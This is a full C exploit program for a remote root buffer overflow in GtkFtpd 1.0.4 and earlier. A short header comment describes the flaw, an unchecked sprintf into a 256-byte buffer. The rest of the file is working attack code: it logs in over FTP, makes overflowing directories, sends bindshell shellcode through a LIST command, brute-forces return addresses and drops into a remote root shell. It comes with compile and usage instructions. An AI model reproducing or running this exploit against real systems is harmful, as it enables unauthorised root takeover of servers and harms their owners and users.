/*[ gtkftpd[v1.0.4(and below)]: remote root buffer overflow exploit. ]*
 *                                                                    *
 * by: vade79/v9 v9@fakehalo.deadpig.org (fakehalo/realhalo)          *
 *                                                                    *
 * Url:                                                               *
 *  http://gtkftpd.sourceforge.net/                                   *
 *                                                                    *
 * GtkFtpd, versions v1.0.4 and below(as of this time), contain a     *
 * remotely exploitable buffer overflow.  the overflow occurs when    *
 * GtkFtpd allocates the appropriate amount of memory to hold a       *
 * filename or directory(256 bytes), but does not account for the     *
 * date/user/stat prefix(~40 bytes) it prepends to the buffer.        *
 *                                                                    *
 * When exploited, things are made easier due to the fact that        *
 * GtkFtpd does not chroot() or drop its root privileges(as are       *
 * required to run the program itself) while running.  And one step   *
 * more easier because when the buffer is overflown it is in a child  *
 * process, making it possible to brute force(not crash).             *
 *                                                                    *
 * Requirements to exploit:                                           *
 *  - A valid account. (user/pass, anonymous will do)                 *
 *  - A writable directory. (usually gtkftpd makes any dir writable)  *
 *                                                                    *
 * Usage:                                                             *
 *  # cc xgtkftpd.c -o xgtkftpd                                       *
 *  # ./xgtkftpd [-Psupcbanrd] -h hostname                            *
 *                                                                    *
 * Exploit workings(ftp commands):                                    *
 *  MKDIR <large name/causes overflow>                                *
 *  LIST -<shellcode> (where the overflow occurs)                     *
 *                                                                    *
 * The exploitable code itself is found in src/sys_cmd.c:             *
 *  12:#define BUF_SIZE 256                                           *
 *  21:char buf[BUF_SIZE];                                            *
 *  57:sprintf(buf, "%s\t%s", perm_date_siz, entr->d_name);           *
 *                                                                    *
 * Note:                                                              *
 *  Make sure the directory used to "LIST" does not already contain   *
 *  any large filenames or directories, as the first overly long one  *
 *  to list will cause the overflow. (which will fail the exploit)    *
 *                                                                    *
 * (should work out of the box on generic linux, tested on rh7.1.     *
 * squished, un-tab'd, un-space'd, exploit code; just how i like it.) *
 **********************************************************************/
#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <getopt.h>
#include <ctype.h>
#include <time.h>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <arpa/inet.h>
/* default definitions, change at will.                           */
#define DFLUSER "anonymous" /* no argument, default username.     */
#define DFLPASS "null@null.com" /* no argument, default password. */
#define DFLDIR "/incoming" /* no argument, default +w directory.  */
#define DFLCLM 80 /* default screen width to use.                 */
#define DFLADDR 0xbffffffa /* base brute address.                 */
#define TIMEOUT 10 /* connection timeout.                         */
static char x86_exec[]= /* bindshell(sport), modded from netric.  */
 /* port defined in byte 20, and 21; in a 'short' cast form.      */
 "\x31\xc0\x50\x40\x89\xc3\x50\x40\x50\x89\xe1\xb0\x66\xcd\x80\x31"
 "\xd2\x52\x66\x68\x00\x00\x43\x66\x53\x89\xe1\x6a\x10\x51\x50\x89"
 "\xe1\xb0\x66\xcd\x80\x40\x89\x44\x24\x04\x43\x43\xb0\x66\xcd\x80"
 "\x83\xc4\x0c\x52\x52\x43\xb0\x66\xcd\x80\x93\x89\xd1\xb0\x3f\xcd"
 "\x80\x41\x80\xf9\x03\x75\xf6\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f"
 "\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80";
/* protos/functions. */
char *getdir(unsigned int);
char *getbdir(void);
char *getcode(void);
void filter_text(char *);
void ftp_printf(int,char *,...);
void ftp_clean(int);
void ftp_read(int);
void ftp_parse(int);
void ftp_connect(void);
void getshell(int,unsigned int);
void printe(char *,short);
void usage(char *);
void sig_ctrlc(){printe("user aborted.",1);}
void sig_alarm(){printe("alarm/timeout hit.",1);}
void sig_pipe(){printe("connection closed/failed.",1);}
/* globals. (ease of use throughout) */
unsigned short align=2; /* probably will never need to be otherwise. */
unsigned short port=21; /* generic ftp daemon port.                  */
unsigned short sport=7979; /* generic bindshell port.                */
unsigned short reverse=0; /* go upward, instead of downward          */
unsigned short no_io=0; /* do not show traffic.                      */
unsigned int attempts=100; /* number of times to brute.              */
unsigned int columns=80; /* generic screen width.                    */
unsigned int ftp_i=0; /* Nth time read ftp socket.                   */
unsigned int baseaddr=DFLADDR; /* base address. (again)              */
char *host; /* hostname/target, a must have.                         */
char *user; /* username to use.                                      */
char *pass; /* password to use.                                      */
char *writedir; /* need a writable directory.                        */
char *basedir; /* gets filled in later.                              */
/* program start. */
int main(int argc,char **argv){
 int chr=0;
 printf("[*] gtkftpd[v1.0.4(and below)]: remote root buffer overflow"
 " exploit.\n[*] by: vade79/v9 v9@fakehalo.deadpig.org (fakehalo)\n\n");
 /* set the chomp point, filter long lines. */
 if(getenv("COLUMNS"))columns=atoi(getenv("COLUMNS"));
 if(7>columns||columns>256)columns=DFLCLM;
 while((chr=getopt(argc,argv,"h:P:s:u:p:c:b:a:n:rd"))!=EOF){
  switch(chr){
   case 'h':
    if(!host&&!(host=(char *)strdup(optarg)))
     printe("main(): allocating memory failed.",1);
    break;
   case 'P':
    port=atoi(optarg);
    break;
   case 's':
    sport=atoi(optarg);
    break;
   case 'u':
    if(!user&&!(user=(char *)strdup(optarg)))
     printe("main(): allocating memory failed.",1);
    break;
   case 'p':
    if(!pass&&!(pass=(char *)strdup(optarg)))
     printe("main(): allocating memory failed.",1);
    break;
   case 'c':
    if(!writedir&&!(writedir=(char *)strdup(optarg)))
     printe("main(): allocating memory failed.",1);
    break;
   case 'b':
    sscanf(optarg,"%x",&baseaddr);
    break;
   case 'a':
    align=atoi(optarg);
    break;
   case 'n':
    attempts=atoi(optarg);
    break;
   case 'r':
    reverse=1;
    break;
   case 'd':
    no_io=1;
    break;
   default:
    usage(argv[0]);
    break;
  }
 }
 if(!host)
  usage(argv[0]);
 /* fill in the blanks, or out of bounds. */
 if(!user)user=DFLUSER;
 if(!pass)pass=DFLPASS;
 if(!writedir)writedir=DFLDIR;
 if(!baseaddr)baseaddr=DFLADDR;
 if(align>3)align=2;
 if(!((sport&0xff00)>>8)||!(sport&0x00ff)){
  printf("[!] shell port defined contains null byte(s), using default.\n");
  sport=7979; /* back to default. */
 }
 /* change the bindshell port. */
 x86_exec[20]=(sport&0xff00)>>8;
 x86_exec[21]=(sport&0x00ff);
 /* verbose. */
 printf("[*] target: %s:%d, identity: %s:%s.\n[*] directory: %s, brute"
 " start: 0x%.8x, alignment: %d.\n[*] memory direction: %s, attempts: "
 "%d, bindshell port: %d.\n\n",host,port,user,pass,writedir,baseaddr,
 align,(!reverse?"downward":"upward"),attempts,sport);
 signal(SIGINT,sig_ctrlc); /* explained/pretty exit.       */
 signal(SIGPIPE,sig_pipe); /* handle abnormal disconnects. */
 ftp_connect();  /* do the magic, brute force.             */
 printe("brute force exhausted, failed.",0);
 exit(0);
}
char *getdir(unsigned int offset){
 unsigned int i=0;
 char *buf;
 /* 256 will fail; 255 or less. */
 if(!(buf=(char *)malloc(255+1)))
  printe("getdir(): allocating memory failed.",1);
 memset(buf,0x0,255+1);
 if(align)memset(buf,'x',align);
 for(i=align;i<252;i+=4){
 if(!reverse)*(long *)&buf[i]=(baseaddr-offset);
 else *(long *)&buf[i]=(baseaddr+offset);
 }
 return(buf);
}
char *getbdir(void){
 char *buf;
 time_t ttt;
 struct tm *ttm;
 if(!(buf=(char *)malloc(32+1)))
  printe("getbdir(): allocating memory failed",1);
 ttt=time(NULL);
 ttm=localtime(&ttt);
 strftime(buf,32,"tmp_%H:%M:%S_%d-%m-%Y",ttm);
 return(buf);
}
char *getcode(void){
 char *buf;
 if(!(buf=(char *)malloc(512+1)))
  printe("getcode(): allocating memory failed",1);
 memset(buf,0x90,(512-strlen(x86_exec)));
 memcpy(buf+(512-strlen(x86_exec)),x86_exec,strlen(x86_exec));
 return(buf);
}
void filter_text(char *ptr){
 unsigned int i=0;
 for(i=0;i<strlen(ptr);i++){
  /* keep it short and sweet. */
  if(i>=(columns-3)){
   ptr[i--]=0x0;
   ptr[i--]='.';
   ptr[i--]='.';
   ptr[i]='.';
  }
  /* don't make \r or \n a '?'. */
  else if(ptr[i]=='\r'||ptr[i]=='\n')ptr[i]=0x0;
  /* don't ugly the local terminal. */
  else if(!isprint(ptr[i]))ptr[i]='?';
 }
 return;
}
void ftp_printf(int sock,char *fmt,...){
 char *buf;
 va_list ap;
 if(!(buf=(char *)malloc(1024+1)))
  printe("ftp_printf(): allocating memory failed.",1);
 memset(buf,0x0,1024+1);
 va_start(ap,fmt);
 vsnprintf(buf,1024,fmt,ap);
 va_end(ap);
 write(sock,buf,strlen(buf)); /* write it, then mod it for display. */
 filter_text(buf);
 if(!no_io)
  printf("-> %s\n",buf);
 free(buf);
 return;
}
void ftp_clean(int sock){
 ftp_printf(sock,"CWD ..\r\n");
 ftp_read(sock);
 ftp_printf(sock,"RMD %s\r\n",basedir);
 ftp_read(sock);
 ftp_printf(sock,"QUIT\r\n");
 ftp_read(sock);
 return;
}
void ftp_read(int sock){
 char *buf;
 if(!(buf=(char *)malloc(1024+1)))
  printe("ftp_read(): allocating memory failed.",1);
 memset(buf,0x0,1024);
 read(sock,buf,1024);
 filter_text(buf);
 if(!no_io)
  printf("<- %s\n",buf);
 /* some initial reply checking, not too much. */
 if(!ftp_i)
  if(!strstr(buf,"GtkFTPd"))
   printe("this exploit is only for GtkFTPd, failed.",1);
 if(ftp_i==2)
  if(strncmp(buf,"230",3))
   printe("invalid username/password, failed.",1);
 if(ftp_i==3)
  if(strncmp(buf,"250",3))
   printe("invalid writable directory, failed. (try \"/\")",1);
 free(buf);
 ftp_i++; /* increase the response identifier. */
 return;
}
void ftp_parse(int sock){
 unsigned int offset=0;
 ftp_read(sock); /* get the banner. */
 ftp_printf(sock,"USER %s\r\n",user);
 ftp_read(sock);
 ftp_printf(sock,"PASS %s\r\n",pass);
 ftp_read(sock);
 ftp_printf(sock,"CWD %s\r\n",writedir);
 ftp_read(sock);
 basedir=getbdir(); /* tmp dir of our own to use. */
 ftp_printf(sock,"MKD %s\r\n",basedir);
 ftp_read(sock);
 ftp_printf(sock,"CWD %s\r\n",basedir);
 ftp_read(sock);
 while(offset<(attempts*400)){ /* if it hasn't yet, it's not going to. */
  /* slight null-byte/CR check, only needs to check the last byte.     */
  if((!reverse&&!((baseaddr-offset)&0xff))||(reverse&&!((baseaddr+offset)
  &0xff))||(!reverse&&((baseaddr-offset)&0xff)=='\n')||(reverse&&
  ((baseaddr+offset)&0xff)=='\n')){
   printf("[!] brute address contains null-byte/CR, increasing offset "
   "by one byte.\n");
   offset++; /* one byte off if reversed won't hurt here. (401) */
  }
  /* make the evil oversized directory. (255 or less bytes) */
  ftp_printf(sock,"MKD %s\r\n",getdir(offset));
  ftp_read(sock);
  /* date+directory exceeds 256 byte buffer, the exploit. */
  sleep(1); /* delay insurance. */
  ftp_printf(sock,"LIST -%s\r\n",getcode());
  /* nothing to read here, and gtkftpd processes (the exploit) */
  /* before the ftp list connection is made, making it         */
  /* pointless to view the list.                               */
  sleep(1); /* delay insurance, again, just to be sure.        */
  /* delete directory, multiples will cause failure(s).        */
  ftp_printf(sock,"RMD %s\r\n",getdir(offset));
  ftp_read(sock);
  getshell(sock,offset);
  offset+=400; /* always at least 400 nops in a row, in shellcode. */
 }
 ftp_clean(sock);
 close(sock);
 return;
}
void ftp_connect(void){
 int sock;
 struct hostent *t;
 struct sockaddr_in s;
 sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
 s.sin_family=AF_INET;
 s.sin_port=htons(port);
 if((s.sin_addr.s_addr=inet_addr(host))){
  if(!(t=gethostbyname(host)))
   printe("couldn't resolve hostname.",1);
  memcpy((char*)&s.sin_addr,(char*)t->h_addr,sizeof(s.sin_addr));
 }
 printf("[*] attempting to connect: %s:%d.\n",host,port);
 signal(SIGALRM,sig_alarm);
 alarm(TIMEOUT);
 if(connect(sock,(struct sockaddr *)&s,sizeof(s)))
  printe("gtkftpd connection failed.",1);
 alarm(0);
 printf("[*] connected successfully: %s:%d.\n",host,port);
 ftp_parse(sock);
 return;
}
void getshell(int ftpsock,unsigned int offset){
 int sock,r;
 fd_set fds;
 char buf[4096+1];
 struct hostent *he;
 struct sockaddr_in sa;
 if((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==-1)
  printe("getshell(): socket() failed.",1);
 sa.sin_family=AF_INET;
 if((sa.sin_addr.s_addr=inet_addr(host))){
  if(!(he=gethostbyname(host)))
   printe("getshell(): couldn't resolve.",1);
  memcpy((char *)&sa.sin_addr,(char *)he->h_addr,sizeof(sa.sin_addr));
 }
 sa.sin_port=htons(sport);
 signal(SIGALRM,sig_alarm);
 alarm(TIMEOUT);
 printf("[*] checking for bindshell: %s:%d. (0x%.8x)\n",host,sport,
 (!reverse?(baseaddr-offset):(baseaddr+offset)));
 if(connect(sock,(struct sockaddr *)&sa,sizeof(sa))){
  printf("[!] connection failed: %s:%d.\n",host,sport);
  close(sock); /* don't want fd's to fill up. */
  alarm(0);
  return;
 }
 alarm(0);
 printf("[*] successfully connected: %s:%d.\n",host,sport);
 printf("[*] attempting to cleanup leftover directory(s).\n");
 ftp_clean(ftpsock);
 close(ftpsock);
 printf("[*] entering remote shell. (%s:%d)\n\n",host,sport);
 signal(SIGINT,SIG_IGN);
 write(sock,"cd /;uname -a;id\n",18);
 while(1){
  FD_ZERO(&fds);
  FD_SET(0,&fds);
  FD_SET(sock,&fds);
  if(select(sock+1,&fds,0,0,0)<1)
   printe("getshell(): select() failed.",1);
  if(FD_ISSET(0,&fds)){
   if((r=read(0,buf,4096))<1)
    printe("getshell(): read() failed.",1);
   if(write(sock,buf,r)!=r)
    printe("getshell(): write() failed.",1);
  }
  if(FD_ISSET(sock,&fds)){
   if((r=read(sock,buf,4096))<1)exit(0);
   write(1,buf,r);
  }
 }
 close(sock);
 return;
}
void printe(char *err,short e){
 printf("[!] error: %s\n",err);
 if(e)exit(1);
 return;
}
void usage(char *name){
 printf(" usage: %s [options] -h hostname\n\n options:\n"
 "  -h <string>\tdefines the target host/ip.\t(REQUIRED)\n"
 "  -P <number>\tdefines the target port.\t(%d)\n"
 "  -s <number>\tdefines the bindshell port.\t(%d)\n"
 "  -u <string>\tdefines the username.\t\t(\"%s\")\n"
 "  -p <string>\tdefines the password.\t\t(\"%s\")\n"
 "  -c <string>\tdefines the writable directory.\t(\"%s\")\n"
 "  -b <string>\tdefines the base brute address.\t(0x%.8x)\n"
 "  -a <number>\tdefines the alignment.\t\t(%d)\n"
 "  -n <number>\tdefines the number of attempts.\t(%d)\n"
 "  -r\t\tgo upward in memory, instead of downward.\n"
 "  -d\t\tdo not show verbose ftp in/out traffic.\n\n",
 name,port,sport,DFLUSER,DFLPASS,DFLDIR,DFLADDR,align,attempts);
 exit(0);
}

